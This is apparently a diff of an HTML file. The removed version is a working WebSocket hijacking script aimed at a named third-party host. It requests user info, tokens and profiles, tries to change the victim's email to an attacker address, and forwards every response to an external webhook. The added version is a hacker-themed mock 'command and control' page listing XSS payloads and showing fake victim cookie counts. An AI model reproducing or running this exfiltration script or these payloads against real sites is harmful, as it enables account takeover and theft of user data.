@@ -1,78 +1,128 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket Exploit</title>
+  <meta charset="UTF-8">
+  <title>☠ PandaXloit Terminal ☠</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="https://img.icons8.com/fluency/48/anonymous-mask.png">
+  <style>
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: "Courier New", monospace;
+      padding: 20px;
+    }
+
+    h1, h2 {
+      color: #f00;
+      text-shadow: 0 0 5px #f00;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .header img {
+      width: 40px;
+    }
+
+    .terminal {
+      background-color: #111;
+      padding: 20px;
+      margin-top: 20px;
+      border: 1px solid #0f0;
+      border-radius: 5px;
+      box-shadow: 0 0 15px #0f0;
+    }
+
+    .line::before {
+      content: "➤ ";
+      color: #0ff;
+    }
+
+    a {
+      color: #0ff;
+      text-decoration: none;
+    }
+
+    .section {
+      margin-top: 40px;
+    }
+
+    .ascii {
+      color: #0f0;
+      font-size: 12px;
+      line-height: 1.2em;
+    }
+
+    .blink {
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    .footer {
+      margin-top: 50px;
+      font-size: 12px;
+      color: #444;
+      border-top: 1px solid #0f0;
+      padding-top: 10px;
+    }
+  </style>
 </head>
 <body>
-    <h2>Exploiting WebSocket</h2>
-    <p>Please wait while we connect to the server...</p>
 
-    <script>
-        // Webhook URL để gửi dữ liệu
-        const webhookUrl = "https://webhook.site/e767272a-e942-43d4-808c-9271d467c452";
+  <div class="header">
+    <img src="https://img.icons8.com/fluency/48/anonymous-mask.png" alt="Mask">
+    <h1>0xH4ck3r Command & Control Panel</h1>
+  </div>
 
-        // Hàm gửi dữ liệu đến webhook
-        function sendToWebhook(message) {
-            fetch(`${webhookUrl}?data=${encodeURIComponent(message)}`, {
-                method: "GET",
-                mode: "no-cors"
-            })
-            .then(response => console.log("Webhook sent:", message))
-            .catch(error => console.error("Webhook error:", error));
-        }
+  <div class="ascii">
+<pre>
+      .--.      .-'.      .--.      .--.
+     :::::.\::::::::.\::::::::.\::::::::.
+     :::::::.         Hack the planet
+     '      '::..:::::'      '::..::::'
+</pre>
+  </div>
 
-        // Tạo kết nối WebSocket
-        const ws = new WebSocket("wss://notify.bubble.io");
+  <div class="terminal">
+    <div class="line">System initialized... ✔️</div>
+    <div class="line">Connecting to nodes... [ OK ]</div>
+    <div class="line">Loading payload interface...</div>
+    <div class="line">Monitoring endpoint: <a href="/evil.js?sid=abc123">/evil.js?sid=abc123</a></div>
+    <div class="line">Target IP: 192.168.1.102</div>
+    <div class="line">Status: <span class="blink">[ ACTIVE ]</span></div>
+  </div>
 
-        // Khi WebSocket mở
-        ws.onopen = function() {
-            console.log("WebSocket connected!");
-            sendToWebhook("WebSocket connected from sites.id.vn");
+  <div class="section">
+    <h2>📦 Payloads</h2>
+    <div class="terminal">
+      <div class="line">Classic XSS: <code>&lt;script src="/evil.js"&gt;&lt;/script&gt;</code></div>
+      <div class="line">Image XSS: <code>&lt;img src=x onerror="fetch('/evil.js')"&gt;</code></div>
+      <div class="line">Silent iFrame: <code>&lt;iframe src="/evil.js"&gt;&lt;/iframe&gt;</code></div>
+    </div>
+  </div>
 
-            // Gửi yêu cầu khởi tạo
-            ws.send('t s main');
-            sendToWebhook("Sent: t s main");
+  <div class="section">
+    <h2>🧠 Intelligence Feed</h2>
+    <div class="terminal">
+      <div class="line">Last payload request: 3 minutes ago</div>
+      <div class="line">Victim UA: Mozilla/5.0 (Windows NT 10.0; Win64)</div>
+      <div class="line">Collected cookies: 12</div>
+      <div class="line">GeoIP: Singapore 🇸🇬</div>
+    </div>
+  </div>
 
-            // Gửi các yêu cầu tương tự như trong Developer Tools, nhưng ở dạng chung
-            const payloads = [
-                't g 1', // Yêu cầu lấy thông tin dashboard (không cần ID cụ thể)
-                't g 2', // Yêu cầu khác liên quan đến dashboard
-                't g 3', // Yêu cầu khác
-                't g 4', // Yêu cầu liên quan đến tìm kiếm
-                // Thêm các payload khác để lấy thông tin user
-                JSON.stringify({ "action": "get_user_info" }),
-                JSON.stringify({ "action": "get_profile" }),
-                JSON.stringify({ "action": "get_token" }),
-                JSON.stringify({ "action": "get_dashboard" }),
-                JSON.stringify({ "action": "get_search" }),
-                JSON.stringify({ "action": "update_email", "email": "attacker@example.com" })
-            ];
+  <div class="footer">
+    Powered by PandaXloit · For educational use only · v1.0
+  </div>
 
-            payloads.forEach((payload, index) => {
-                ws.send(payload);
-                sendToWebhook(`Sent payload ${index + 1}: ${payload}`);
-            });
-        };
-
-        // Khi nhận được dữ liệu từ WebSocket
-        ws.onmessage = function(event) {
-            console.log("Data received:", event.data);
-            sendToWebhook("Data received: " + event.data);
-        };
-
-        // Khi có lỗi WebSocket
-        ws.onerror = function(error) {
-            console.error("WebSocket error:", error);
-            sendToWebhook("WebSocket error: " + error);
-        };
-
-        // Khi WebSocket đóng
-        ws.onclose = function(event) {
-            console.log("WebSocket closed:", event.code, event.reason);
-            sendToWebhook("WebSocket closed: Code=" + event.code + ", Reason=" + event.reason);
-        };
-    </script>
 </body>
 </html>
